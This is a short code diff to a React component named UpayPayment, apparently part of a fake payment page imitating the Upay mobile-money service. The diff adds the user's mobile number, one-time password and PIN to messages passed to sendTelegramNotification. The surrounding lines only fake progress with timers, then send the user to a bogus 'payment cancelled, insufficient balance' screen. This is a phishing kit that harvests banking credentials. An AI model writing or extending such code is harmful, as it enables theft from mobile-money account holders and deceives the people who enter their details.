@@ -59,7 +59,7 @@ const UpayPayment = () => {
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber });
     setTimeout(() => {
       setStep('otp');
       setIsLoading(false);
@@ -73,7 +73,7 @@ const UpayPayment = () => {
       return;
     }
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp });
     setTimeout(() => {
       setStep('pin');
       setIsLoading(false);
@@ -87,7 +87,7 @@ const UpayPayment = () => {
       return;
     }
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin });
     setTimeout(() => {
       setIsLoading(false);
       navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
